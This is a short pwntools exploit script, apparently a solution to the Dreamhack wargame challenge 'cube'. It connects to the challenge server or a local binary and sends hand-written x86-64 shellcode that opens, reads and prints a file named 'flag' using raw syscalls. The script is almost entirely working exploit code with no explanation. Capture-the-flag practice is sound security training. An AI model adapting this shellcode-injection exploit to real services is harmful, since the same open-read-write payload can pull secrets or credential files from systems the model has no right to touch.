#!/usr/bin/env python3
from pwn import *

PORT = 20987
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./cube', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force

            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

sc = asm('''
    /* open("flag", O_RDONLY) */
    push 0x67616c66
    mov rdi, rsp
    xor esi, esi
    push 2
    pop rax
    syscall

    /* read(fd, rsp - 0x100, 0x100) */
    mov edi, eax
    sub rsp, 0x100
    mov rsi, rsp
    mov edx, 0x100
    xor eax, eax
    syscall

    /* write(1, buf, bytes_read) */
    mov edx, eax
    push 1
    pop rdi
    push 1
    pop rax
    syscall

''')


sa(b'shellcode: ', sc)

p.interactive()